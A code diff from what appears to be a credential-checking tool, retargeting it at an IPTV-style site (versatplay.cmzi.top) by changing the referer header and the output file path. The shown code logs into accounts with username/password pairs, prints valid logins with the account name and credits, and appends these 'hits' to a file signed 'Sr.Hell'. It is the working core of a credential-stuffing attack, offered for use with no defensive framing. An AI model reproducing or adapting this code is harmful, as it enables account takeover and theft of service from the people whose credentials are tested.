@@ -82,7 +82,7 @@ def login_and_get_dashboard(username, password):
             dashboard_url = 'https://versatplay.cmzi.top/dashboard'
             dashboard_headers = {
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'referer': 'https://one.cmsi.site/',
+                'referer': 'https://versatplay.cmzi.top/',
                 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                 'upgrade-insecure-requests': '1'
             }
@@ -128,7 +128,7 @@ def process_account(user, password, i, total):
         print(VERDE + f"\n==[ Login válido ]==\n • User: {user}\n • Pass: {password}" + RESET)
         print(f" ===<use infos/>===\n • Nome: {name}")
         print(f" • Créditos: {credits}")
-        with open("/storage/emulated/0/Hits/one_tv_hits.txt", "a") as hit_file:
+        with open("/storage/emulated/0/Hits/versatplay_tv_hits.txt", "a") as hit_file:
             hit_file.write(f"\n===<Sr.Hell/>===\n• User: {user}\n• Pass: {password}\n===<info user/>===\n• Nome: {name}\n• Créditos: {credits}\n")
         return True
     else:
